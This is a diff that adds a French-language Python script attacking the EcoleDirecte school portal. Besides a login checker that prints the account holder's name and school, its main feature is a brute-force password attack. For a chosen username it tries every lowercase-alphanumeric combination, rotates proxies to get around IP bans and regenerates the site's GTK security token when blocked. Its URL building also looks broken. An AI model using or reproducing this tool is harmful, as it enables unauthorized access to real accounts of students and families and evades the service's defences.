@@ -1,0 +1,214 @@
+import json
+import itertools
+import requests as req
+from rich import print
+
+# Version actuelle de l'API ciblée
+VERSION_API = "4.75.0"
+
+# En-têtes de navigation pour simuler un vrai navigateur
+HEADERS_BASE = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Accept": "application/json, text/plain, */*",
+    "Accept-Language": "fr,fr-FR;q=0.9,en;q=0.8",
+    "Origin": "https://ecoledirecte.com",
+    "Referer": "https://ecoledirecte.com/",
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+# =====================================================================
+# INITIALISATION DE LA SESSION ET RÉCUPÉRATION DU JETON GTK
+# =====================================================================
+def initialiser_session_ed():
+    """
+    Crée une session et effectue la pré-requête obligatoire pour récupérer 
+    le jeton de sécurité 'GTK' exigé par EcoleDirecte.
+    """
+    session = req.Session()
+    session.headers.update(HEADERS_BASE)
+    
+    # Étape obligatoire : pré-requête GET pour initialiser le jeton GTK
+    pre_url = f"https://ecoledirecte.com{VERSION_API}"
+    try:
+        init_res = session.get(pre_url, timeout=10)
+        
+        # On essaie de récupérer le cookie 'GTK' généré par le serveur
+        gtk_token = session.cookies.get("GTK")
+        if gtk_token:
+            # On l'injecte dans les en-têtes obligatoires pour la suite
+            session.headers.update({"X-Gtk": gtk_token})
+        return session
+    except Exception as e:
+        print(f"[bold yellow]⚠ Impossible d'initialiser le jeton GTK ({e}). Tentative de poursuite quand même...[/bold yellow]")
+        return session
+
+# =====================================================================
+# FONCTION DE CONNEXION DIRECTE / VÉRIFICATION (MENU 2)
+# =====================================================================
+def tester_connexion(username, password, mode="verifier"):
+    session = initialiser_session_ed()
+    login_url = f"https://ecoledirecte.com{VERSION_API}"
+    
+    data = {
+        "identifiant": username,
+        "motdepasse": password,
+        "isRelogin": False,
+        "uuid": ""
+    }
+    payload = 'data=' + json.dumps(data)
+    
+    try:
+        response = session.post(login_url, data=payload, timeout=10)
+        resp = response.json()
+        
+        if resp.get("code") == 200:
+            print("[bold green]✔ Identifiants valides ![/bold green]")
+            if mode == "connecter":
+                print("[bold blue]\n--- Informations du compte ---[/bold blue]")
+                accounts = resp.get("data", {}).get("accounts", [])
+                if accounts:
+                    compte = accounts[0]
+                    prenom = compte.get("prenom", "Inconnu")
+                    nom = compte.get("nom", "Inconnu")
+                    type_compte = compte.get("typeCompte", "Inconnu")
+                    etab = compte.get("nomEtablissement", "Non spécifié")
+                    
+                    print(f"[green]Utilisateur :[/green] {prenom} {nom}")
+                    print(f"[green]Type :[/green] {type_compte}")
+                    print(f"[green]Établissement :[/green] {etab}")
+                else:
+                    print("[yellow]Connexion réussie, mais aucune donnée de profil disponible.[/yellow]")
+        else:
+            print(f"[bold red]❌ Échec de la connexion.[/bold red]")
+            print(f"[red]Code : {resp.get('code')} | Message : {resp.get('message', 'Identifiants ou jeton invalides')}[/red]")
+            
+    except req.exceptions.ConnectionError:
+        print("[bold red]❌ La requête a encore été rejetée par le pare-feu (Remote Disconnected).[/bold red]")
+        print("[yellow]Astuce : Votre adresse IP actuelle est peut-être temporairement bannie pour requêtes trop fréquentes.[/yellow]")
+    except Exception as e:
+        print(f"[bold red]Erreur inattendue : {e}[/bold red]")
+
+# =====================================================================
+# FONCTION DE BRUTE FORCE (MENU 1)
+# =====================================================================
+def brute_force_login(username, min_char, max_char, use_proxies, write_tries, ip_list):
+    found = False
+    nb = 0
+    word = ""
+    login_url = f"https://ecoledirecte.com{VERSION_API}"
+
+    # On initialise une session globale pour le brute force
+    session = initialiser_session_ed()
+
+    for length in range(min_char, max_char + 1):
+        for combination in itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=length):
+            word = ''.join(combination)
+            
+            if use_proxies == "Y" and ip_list:
+                session.proxies = {"http": ip_list[nb]}
+            
+            data = {
+                "identifiant": username,
+                "motdepasse": word,
+                "isRelogin": False,
+                "uuid": ""
+            }
+            payload = 'data=' + json.dumps(data)
+            
+            try:
+                response = session.post(login_url, data=payload, timeout=5)
+                resp = response.json()
+                
+                if write_tries == "Y":
+                    print(resp.get("code"), word)
+
+                if resp.get("code") == 200:
+                    found = True
+                    break
+                
+                # Si le serveur nous demande de renouveler à cause d'un blocage
+                if resp.get("code") == 505 or "GTK" not in session.headers:
+                    session = initialiser_session_ed() # On régénère le jeton de sécurité
+                    
+            except:
+                pass  
+
+            if use_proxies == "Y" and ip_list:
+                nb = (nb + 1) if (nb < len(ip_list) - 1) else 0
+                
+        if found:
+            break
+            
+    return word if found else None
+
+# =====================================================================
+# MENU PRINCIPAL
+# =====================================================================
+print("[bold cyan]Menu Principal :[/bold cyan]")
+print(" [1] Mode Brute force")
+print(" [2] Saisir directement un login et mdp")
+reponse = input("Que veux-tu faire ? ")
+
+if reponse == "2":
+    login_input = input("Entrez le login : ")
+    mdp_input = input("Entrer le mdp : ")
+    
+    print("\n[bold cyan]Sous-menu Action :[/bold cyan]")
+    print(" [1] Vérifier uniquement si le compte existe / identifiants valides")
+    print(" [2] Se connecter et afficher les infos de l'élève dans le terminal")
+    choix_action = input("Votre choix : ")
+    
+    if choix_action == "1":
+        print("\nVérification en cours...")
+        tester_connexion(login_input, mdp_input, mode="verifier")
+    elif choix_action == "2":
+        print("\nConnexion en cours...")
+        tester_connexion(login_input, mdp_input, mode="connecter")
+    else:
+        print("[red]Choix de sous-menu invalide.[/red]")
+
+elif reponse == "1":
+    Proxies = input("Proxies (slower) Y/N : ").upper()
+    while Proxies not in ["Y", "N"]:
+        Proxies = input("Proxies (slower) Y/N : ").upper()
+        
+    write = input("Write Tries (slower) Y/N : ").upper()
+    while write not in ["Y", "N"]:
+        write = input("Write Tries (slower) Y/N : ").upper()
+        
+    while True:
+        try:
+            min_c = int(input("minimum character : "))
+            break
+        except ValueError:
+            pass
+            
+    while True:
+        try:
+            max_c = int(input("maximum character : "))
+            break
+        except ValueError:
+            pass
+            
+    username = input("Username : ")
+    
+    ip = []
+    if Proxies == "Y":
+        try:
+            with open("http_proxies.txt", "r") as f:
+                ip = f.read().splitlines()
+        except FileNotFoundError:
+            print("[red]Fichier http_proxies.txt introuvable. Passage sans proxy.[/red]")
+            Proxies = "N"
+
+    if write == "N":
+        print("Working...")
+        
+    password = brute_force_login(username, min_c, max_c, Proxies, write, ip)
+    
+    if password:
+        print("[bold green]\nThe password is :[/bold green]", password)
+    else:
+        print("[bold red]\nPassword not found.[/bold red]")
+else:
+    print("[red]Option de menu principal inconnue.[/red]")
